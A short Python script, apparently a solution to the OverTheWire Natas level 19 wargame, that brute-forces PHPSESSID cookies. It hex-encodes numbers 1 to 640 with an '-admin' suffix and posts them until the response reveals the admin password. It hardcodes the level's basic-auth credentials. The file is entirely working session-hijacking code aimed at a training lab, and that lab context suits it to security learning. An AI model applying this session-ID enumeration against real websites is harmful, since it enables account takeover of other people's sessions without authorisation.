import requests
import string
#char=string.ascii_letters+string.digits
payload={'username':'admin','password':'aaa'}
php_sess="2d61646d696e"
for i in range(1,641):
	val=str(i)
	bytes_representation = val.encode('utf-8')
	hex_val= str(bytes_representation.hex())
	cookies = {'PHPSESSID':f'{hex_val}{php_sess}'}
	r=requests.post("http://natas19.natas.labs.overthewire.org/index.php?debug=koko",auth=("natas19","tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"),data=payload,cookies=cookies)
	if 'Password' in r.text:
		print(i)
		print("Password found")
		print(r.text)
		break


		
	
			

